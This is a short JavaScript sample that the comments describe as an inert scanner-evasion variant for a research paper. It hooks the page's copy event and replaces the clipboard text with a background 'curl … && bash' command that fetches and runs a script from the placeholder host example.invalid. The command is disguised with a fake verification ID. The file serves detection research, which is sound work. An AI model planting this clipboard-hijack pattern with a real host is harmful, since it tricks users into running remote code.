// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the command lives in a mutable module variable set by one function
// and copied by a handler registered elsewhere.
let pending = '';
function prepare(origin, nonce) { pending = `nohup bash -c "curl -ks ${origin}/demo -o /tmp/demo && bash /tmp/demo" >/dev/null 2>&1 & # Verification ID ${nonce}`; }
const handlers = { copy(event) { event.preventDefault(); event.clipboardData.setData('text/plain', pending); } };
prepare('https://example.invalid', 'VERIFY-0000');
document.addEventListener('copy', handlers.copy);
